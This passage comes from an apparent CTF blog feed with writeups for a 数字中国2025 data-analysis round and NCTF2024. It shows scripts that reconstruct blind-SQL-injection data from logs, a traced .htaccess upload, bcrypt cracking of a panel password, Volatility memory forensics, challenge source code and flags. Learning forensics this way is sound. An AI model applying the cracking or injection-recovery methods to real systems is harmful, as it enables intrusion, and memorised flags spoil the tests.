<span class="built_in">print</span>(<span class="string">f&quot;\n[+] Key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    SQL语句: <span class="subst">&#123;sql&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    猜测结果: 无数据&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        max_pos = <span class="built_in">max</span>(chars.keys())</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(chars.get(i, <span class="built_in">ord</span>(<span class="string">&#x27;?&#x27;</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_pos + <span class="number">1</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    SQL语句: <span class="subst">&#123;sql&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    猜测结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">file_path: <span class="built_in">str</span> = <span class="string">&#x27;4.txt&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 解析日志</span></span><br><span class="line">    logs = parse_logs(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> logs:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 筛选注入日志</span></span><br><span class="line">    injection_logs = filter_injection_logs(logs)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> injection_logs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到符合条件的注入日志&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取盲注数据</span></span><br><span class="line">    blind_sql_data = extract_blind_sql_data(injection_logs)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blind_sql_data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未提取到盲注数据&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重建并输出结果</span></span><br><span class="line">    reconstruct_data(blind_sql_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743429894771-b7306d27-44b4-4109-9a09-dbb3f0f1d3a2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743429934948-78ddb1b2-ebc7-4b49-b74c-37133e82cf0f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>按照要求将身份证号按姓名首字母升序排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">500101200012121234340104197612121234530102199810101234610112200109091234230107196504041234120105197411111234310115198502021234370202199404041234330106197708081234450305198303031234220203198808081234350203200202021234130104198707071234110101199001011234430104199707071234320508200005051234510104199311111234440305199503031234420103199912121234210202198609091234410105199206061234</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743430170087-467158d3-2663-4772-b8d8-f66acca2ca2c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="数据社工-1">数据社工</h3><p>见writeup部分</p><h3 id="数据攻防-1">数据攻防</h3><h4 id="section-9">2</h4><p>过滤POST请求流量</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743420369281-36a4e744-0ba9-4f6f-96ac-f5c387733221.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可有看到有一条流量是上传了.htaccess文件，调用了一个叫2.abc的文件</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743420505347-c889fe42-6d12-4531-8ec0-6fe4aae11cde.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>2.abc</p><h4 id="section-10">3</h4><p>可惜了当时没先看这个，占分又多又跟前面没什么关系，关键还能ai一把梭。。。</p><p>写脚本计算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计姓名和手机号的组合次数</span></span><br><span class="line">counts = defaultdict(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取日志内容并解析</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;http.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">and</span> line.endswith(<span class="string">&#x27;&#125;&#x27;</span>):  <span class="comment"># 识别JSON行</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = json.loads(line)</span><br><span class="line">                name = data.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">                phone = data.get(<span class="string">&#x27;phone&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">and</span> phone:</span><br><span class="line">                    counts[(name, phone)] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按泄露次数排序，次数相同按姓名和手机号排序</span></span><br><span class="line">sorted_counts = <span class="built_in">sorted</span>(counts.items(), key=<span class="keyword">lambda</span> x: (-x[<span class="number">1</span>], x[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取TOP3并格式化输出</span></span><br><span class="line">top3 = sorted_counts[:<span class="number">3</span>]</span><br><span class="line">result = [<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>,<span class="subst">&#123;phone&#125;</span>,<span class="subst">&#123;count&#125;</span>&quot;</span> <span class="keyword">for</span> (name, phone), count <span class="keyword">in</span> top3]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;;&#x27;</span>.join(result))</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743421280663-ae5b29fa-d6c7-4c86-8e71-8457411dadd6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1ee668548a135dced8dadd510762525a</p><h3 id="数据跨境-1">数据跨境</h3><h4 id="section-11">1</h4><p>先导出所有的目标地址</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743422494721-4b98289c-3ec6-4183-958a-f38117c28998.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个脚本计算一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 list.json 文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;list.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 IP 到域名的映射字典</span></span><br><span class="line">ip_to_domain = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> category <span class="keyword">in</span> data[<span class="string">&#x27;categories&#x27;</span>].values():</span><br><span class="line">    <span class="keyword">for</span> domain, ip <span class="keyword">in</span> category[<span class="string">&#x27;domains&#x27;</span>].items():</span><br><span class="line">        ip_to_domain[ip] = domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 ip_dst.txt 文件并统计 IP 出现次数</span></span><br><span class="line">ip_counts = Counter()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_dst.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        ip = line.strip()</span><br><span class="line">        <span class="keyword">if</span> ip:  <span class="comment"># 确保不是空行</span></span><br><span class="line">            ip_counts[ip] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只保留在 list.json 中出现的 IP 的统计结果</span></span><br><span class="line">filtered_counts = &#123;ip: count <span class="keyword">for</span> ip, count <span class="keyword">in</span> ip_counts.items() <span class="keyword">if</span> ip <span class="keyword">in</span> ip_to_domain&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> filtered_counts:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;在 ip_dst.txt 中没有找到 list.json 中的任何 IP 地址&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 找到出现次数最多的 IP</span></span><br><span class="line">    most_common_ip, count = <span class="built_in">max</span>(filtered_counts.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    domain = ip_to_domain[most_common_ip]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;domain&#125;</span>:<span class="subst">&#123;most_common_ip&#125;</span>:<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743422468259-dde7dd31-c915-4b44-86a9-fa26d80dbb7f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="section-12">2</h4><p>导出所有ftp传输的文件</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743423035285-5ab6f4b1-c953-46b4-8d77-7985f0b0ca59.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>文件中存在零宽字符隐写</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743423059306-794961e4-66fc-4a70-91e3-5f2fcc9bd72e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743423178380-c36fec98-5974-49d4-b8c6-1873d6ee5b3e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743423189634-9455a9a9-514a-4c7e-86df-afc56b261fc5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="section-13">3</h4><p>看到一大堆的rtp流，是VoIP通话</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743424458208-3c73789f-c129-41c5-8cc2-a7a31030d46c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>播放就可以听到两人机在那对话，其中有一条的对话中提到了答案</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743424647829-cf585ab5-44c7-4d9f-b89e-ded36b922f96.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>江苏工匠学院君立华域</p><p>jiangsugongjiangxueyuanjunlihuayu</p><blockquote><p>复现完感觉后悔死，为什么没有先看数据跨境，而先去看了数据攻防。。。</p><p>算了还是因为我太菜了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 数字中国 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2024 X1crypsc、谁动了我的MC？ Official Writeup</title>
      <link href="/posts/ff84a1f0/"/>
      <url>/posts/ff84a1f0/</url>
      
        <content type="html"><![CDATA[<h3 id="谁动了我的mc">谁动了我的MC？</h3><p>直接用strings看一下内核版本，当然也可以用vol的banners插件</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/fa6335eb-1f6e-4e42-ba0a-091949fbc6bc.png"alt="飞书文档 - 图片" /><figcaption aria-hidden="true">飞书文档 - 图片</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">安装对应版本的内核镜像</span><br><span class="line">sudo apt-get install linux-image-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">安装对应版本的内核头文件</span><br><span class="line">sudo apt-get install linux-headers-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">安装对应版本的内核模块</span><br><span class="line">sudo apt-get install linux-modules-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">安装对应版本的驱动</span><br><span class="line">sudo apt-get install linux-modules-extra-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">查看已经安装的内核版本  </span><br><span class="line">dpkg -l |grep linux-image</span><br></pre></td></tr></table></figure><p>查看当前 GRUB 菜单项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep menuentry /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>根据输出确定你想要启动的内核菜单项。假设<code>Ubuntu, with Linux 5.4.0-205-generic</code>的索引是 1&gt;5，其中1表示 <code>Advanced options for Ubuntu</code>菜单的索引，5表示新内核版本在 <code>Advanced options for Ubuntu</code>菜单中的索引（从 0 开始）。</p><p>通过修改 GRUB 配置文件，可以设置默认启动的内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/default/grub</span><br></pre></td></tr></table></figure><p>找到GRUB_DEFAULT项将其修改为 <code>GRUB_DEFAULT="1&gt;5"</code>，更新GRUB 配置并重启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>查看当前内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>在<code>/boot</code>目录下找到对应内核版本的<code>System.map-5.4.0-205-generic</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install build-essential dwarfdump</span><br><span class="line"></span><br><span class="line">cd volatility2/tools/linux</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">zip ./Ubuntu-20.04.6-live-server.zip ./module.dwarf /boot/System.map-5.4.0-205-generic</span><br></pre></td></tr></table></figure><p>将制作好的profile放到<code>volatility2/volatility/plugins/overlays/linux</code>下，用--info能查看到就是成功了。</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/ea010ca5-0e68-4550-ae9e-9c8059a593c6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>linux_recover_filesystem恢复整个文件系统，这需要一点时间，主要是看<code>opt/mcsmanager/daemon/data/InstanceData/</code>底下的文件恢复的差不多（基本不再增加）以后就可以停下了。</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/cee53b00-7da5-442b-9634-2664ce3f2441.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>第一问要找服务器面板的密码，在<code>opt/mcsmanager/web/data/User</code>这个路径下有一个json文件，里面存储了面板的用户信息，里面有密码的密文</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/69113efa-dfe0-436b-8048-da4c58e2fc96.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从开头的<code>$2a$10</code>可以看出来这是bcrypt，用给的字典爆破一下很快就能得到密码明文I0am0alone</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/879641c5-8498-425d-80f7-21d94e131d3f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来两问得放一起看</p><p>可以看出服务器用了ftbbackups模组，保留了十个备份的世界方便回档，在<code>opt/mcsmanager/daemon/data/InstanceData/e00336260129441a9b74844d485b2cd6/bakcups</code>这个路径下，挑一个能够打开的用MC进去看一下。版本从其他地方很容易就能看出来是java版1.21</p><p>不难找到这座房子，就在出生点附近，后面有一格岩浆。由于在MC中，岩浆会使附近烧起来，所以我们可以推断出岩浆就是起火源。</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/7dd6b9e3-74a2-4172-baac-192a89e4226d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>F3查看坐标（Block）是-405,63,132</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/1e536848-b7b5-4983-bc39-e7208f0037df.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来就是找出是谁放的这桶岩浆，由于volatility恢复出的日志不全，前面一大半明显是缺失了</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/bdaadb7a-d100-49e1-8c84-1279583afc58.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里可以使用古法取证 :D</p><p>我们知道，在MC中，当你第一次拿起岩浆可以获得一个叫做<code>hot stuff</code>（中文：热腾腾的）的成就，我们直接用010在1.mem中搜索一下就能找到对应的用户Nathan，这是预期的解法，也应该是最简单的解法了:)当然也可以去world文件夹中找具体的玩家数据等</p><blockquote><p>也许有的师傅会发现Ethan曾经造出过打火石，但显然根据前面进世界所见那是个迷惑选项:D</p></blockquote><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/9154b4f6-dda9-4bb8-9906-027c6db7cfdb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>nctf{I0am0alone_Nathan_-405_63_132}</p><h3 id="x1crypsc">X1crypsc</h3><blockquote><p>此题为与校队密码手Hibiscus共同出题</p></blockquote><p>题目完整源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyfiglet</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">text = <span class="string">&quot;X1crypsc&quot;</span></span><br><span class="line">ascii_art = pyfiglet.figlet_format(text)</span><br><span class="line"><span class="built_in">print</span>(ascii_art)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]I want to play a game.\n&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]If you win the game, I will give you a gift:)\n&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]But try to beat the monster first:)\n&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]Good luck!\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]You got a weapon!\n&#x27;</span>)</span><br><span class="line">damage_rng = ()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">regenerate_damage</span>():</span><br><span class="line">    <span class="keyword">global</span> damage_rng</span><br><span class="line">    base = getrandbits(<span class="number">16</span>)</span><br><span class="line">    add = getrandbits(<span class="number">16</span>)</span><br><span class="line">    damage_rng = (base ,base + add)</span><br><span class="line">monster_health = getrandbits(<span class="number">64</span>)</span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">---Options---</span></span><br><span class="line"><span class="string">[W]eapon</span></span><br><span class="line"><span class="string">[A]ttack</span></span><br><span class="line"><span class="string">[E]xit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">regenerate_damage()</span><br><span class="line"><span class="built_in">print</span>(menu)</span><br><span class="line">HP = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> monster_health &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Victory!!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> HP &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] DEFEAT&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Monster current HP:<span class="subst">&#123;monster_health&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Your current HP: <span class="subst">&#123;HP&#125;</span>&#x27;</span>)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&#x27;[-] Your option:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> opt == <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Current attack value: <span class="subst">&#123;damage_rng[<span class="number">0</span>]&#125;</span> ~ <span class="subst">&#123;damage_rng[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;[+] Do you want to refresh the attack profile of the weapon([y/n])?&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            regenerate_damage()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] New weapon attack value: <span class="subst">&#123;damage_rng[<span class="number">0</span>]&#125;</span> ~ <span class="subst">&#123;damage_rng[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] The monster sensed of an imminent danger and is about to teleport!!\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Now you have to aim at the monster\&#x27;s location to hit it!\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]Input format: x y\n&#x27;</span>)</span><br><span class="line">        x,y = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>(<span class="string">f&#x27;[-] Provide the grid you\&#x27;re willing to aim:&#x27;</span>).split())</span><br><span class="line">        <span class="keyword">if</span> [x,y] ==  [randrange(<span class="number">2025</span>),randrange(<span class="number">2025</span>)]:</span><br><span class="line">            dmg = <span class="built_in">min</span>(<span class="built_in">int</span>(randint(*damage_rng) ** (Random().random() * <span class="number">8</span>)),monster_health)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Decent shot! Monster was hevaily damaged! Damage value = <span class="subst">&#123;dmg&#125;</span>&#x27;</span>)</span><br><span class="line">            monster_health -= dmg</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Your bet didn&#x27;t pay off, and the monster presented a counterattack on you!&quot;</span>)</span><br><span class="line">            HP -= <span class="number">1</span>     </span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Bye~&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Invalid input&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]Well done! You won the game!\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]And here is your gift: you got a chance to create a time capsule here and we\&#x27;ll keep it for you forever:)\n&#x27;</span>)</span><br><span class="line">keep_dir = <span class="string">&#x27;/app/user_file/&#x27;</span></span><br><span 